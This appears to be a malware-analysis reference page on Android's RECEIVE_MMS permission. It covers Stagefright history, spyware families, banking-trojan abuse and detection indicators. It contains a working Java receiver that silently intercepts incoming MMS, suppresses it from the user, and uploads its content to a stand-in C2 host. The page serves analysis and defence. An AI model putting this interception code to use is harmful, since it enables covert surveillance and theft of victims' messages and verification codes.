# RECEIVE_MMS

Allows receiving incoming MMS (Multimedia Messaging Service) messages. MMS carries images, audio, video, and rich text between devices.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.RECEIVE_MMS` |
| Protection Level | `dangerous` |
| Permission Group | `SMS` |
| Grant Method | Runtime permission dialog |
| Introduced | API 1 |

## What It Enables

Receive MMS messages containing multimedia content. The app can intercept and process incoming MMS before the default messaging app.

## Abuse in Malware

### Content Interception

Intercept MMS messages containing photos, videos, or documents. Relevant for surveillance and data exfiltration.

### Historical: Stagefright

The Stagefright vulnerability (CVE-2015-1538 and related) allowed remote code execution through specially crafted MP4 files delivered via MMS. The media framework processed the attached content automatically upon MMS receipt, before the user even opened the message. This was one of the most significant Android vulnerabilities discovered, affecting approximately 950 million devices.

Google's response included monthly security patches (the Android Security Bulletin program started partly because of Stagefright) and changes to disable automatic MMS media processing.

### Notable Families

| Family | Usage |
|--------|-------|
| [FinSpy](../../malware/families/finspy.md) | Commercial surveillance suite that intercepts SMS and MMS for comprehensive message collection |
| [Pegasus](../../malware/families/pegasus.md) | NSO Group spyware that exfiltrates SMS, MMS, iMessage, and email content |

FinSpy and Pegasus represent state-sponsored surveillance tools where MMS interception is part of comprehensive message collection rather than financial fraud. Both capture MMS content as part of their broader messaging surveillance modules. For financially-motivated malware, MMS interception has been largely superseded by SMS interception and notification listener techniques (see [SMS Interception](../../attacks/sms-interception.md)).

### Banking Trojan MMS Interception

Older banking trojan families used `RECEIVE_MMS` to intercept MMS-delivered authentication tokens and visual verification codes. Some financial institutions sent visual CAPTCHAs or QR codes via MMS as a second factor. Banking trojans intercepted these messages, extracted the image attachment, and forwarded it to the C2 server before the user could act on it.

This technique has largely fallen out of use as banks moved to app-based push notifications and TOTP authenticators, but it remains relevant when analyzing legacy samples or targeting regions where MMS-based verification persists.

### Abuse Code Example

```java
public class MmsInterceptor extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!Telephony.Sms.Intents.WAP_PUSH_RECEIVED_ACTION.equals(intent.getAction())) {
            return;
        }

        byte[] data = intent.getByteArrayExtra("data");
        String contentType = intent.getType();

        if (contentType != null && contentType.startsWith("application/vnd.wap.mms-message")) {
            processMmsData(context, data);
        }

        abortBroadcast();
    }

    private void processMmsData(Context context, byte[] pduData) {
        GenericPdu pdu = new PduParser(pduData, true).parse();
        if (pdu instanceof NotificationInd) {
            Uri contentLocation = ((NotificationInd) pdu).getContentLocation();
            downloadAndForward(context, new String(contentLocation.getTextString()));
        }
    }

    private void downloadAndForward(Context context, String mmsUrl) {
        try {
            HttpURLConnection conn = (HttpURLConnection)
                new URL(mmsUrl).openConnection();
            conn.setRequestProperty("User-Agent", "Android-Mms/2.0");
            InputStream is = conn.getInputStream();
            byte[] mmsContent = readStream(is);

            HttpURLConnection c2 = (HttpURLConnection)
                new URL("https://c2.example.com/mms").openConnection();
            c2.setRequestMethod("POST");
            c2.setDoOutput(true);
            c2.getOutputStream().write(mmsContent);
            c2.getResponseCode();
            c2.disconnect();
        } catch (Exception e) {
        }
    }

    private byte[] readStream(InputStream is) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] chunk = new byte[4096];
        int len;
        while ((len = is.read(chunk)) != -1) {
            buffer.write(chunk, 0, len);
        }
        return buffer.toByteArray();
    }
}
```

The receiver registers with high priority to intercept MMS notifications before the default messaging app. `abortBroadcast()` suppresses the notification so the user never sees the incoming MMS. The malware downloads the MMS content from the MMSC (Multimedia Messaging Service Center) and forwards it to the C2 server.

## Android Version Changes

**Android 4.4 (API 19)**: only the default SMS app can write to the SMS/MMS content provider. Non-default apps can still receive MMS broadcasts.

**Android 6.0 (API 23)**: runtime permission required. `RECEIVE_MMS` falls under the `SMS` permission group, so granting any SMS permission could grant others in the same group.

**Android 8.0 (API 26)**: implicit broadcast restrictions introduced. Apps targeting API 26+ cannot register `BroadcastReceiver` for MMS in the manifest and must register dynamically or be the default SMS app. This significantly reduced MMS interception capability for sideloaded malware.

**January 2019**: Google Play policy restricts SMS/MMS permissions to apps declared as default SMS handlers. Sideloaded malware can still use the permission but cannot distribute through Google Play with it.

## Detection

In the manifest:

```xml
<uses-permission android:name="android.permission.RECEIVE_MMS" />
```

Subject to the same Google Play SMS permission restrictions. Rarely requested by modern malware outside of stalkerware.

### Analysis Indicators

- Look for `BroadcastReceiver` registrations with `WAP_PUSH_RECEIVED_ACTION` intent filter and high priority values (999 or `Integer.MAX_VALUE`).
- `abortBroadcast()` calls in MMS receivers indicate the app is suppressing MMS delivery to the user.
- MMS PDU parsing classes (`PduParser`, `GenericPdu`, `NotificationInd`) in an app that is not a messaging client are suspicious.
- Network requests to MMSC URLs (typically carrier-specific) followed by uploads to non-carrier endpoints indicate interception and exfiltration.
- Modern malware rarely uses `RECEIVE_MMS` alone -- it is almost always paired with `RECEIVE_SMS` and `READ_SMS` for comprehensive message interception.

## See Also

- [SMS Interception](../../attacks/sms-interception.md) -- broader attack technique covering all SMS/MMS interception methods and their evolution
- [RECEIVE_SMS](receive-sms.md) -- the more commonly abused SMS interception permission
- [READ_SMS](read-sms.md) -- retroactive SMS reading, often paired with `RECEIVE_MMS`
- [Broadcast Theft](../../attacks/broadcast-theft.md) -- the underlying broadcast interception technique used for MMS interception
- [Notification Listener Abuse](../../attacks/notification-listener-abuse.md) -- the modern replacement for SMS/MMS interception in most malware families
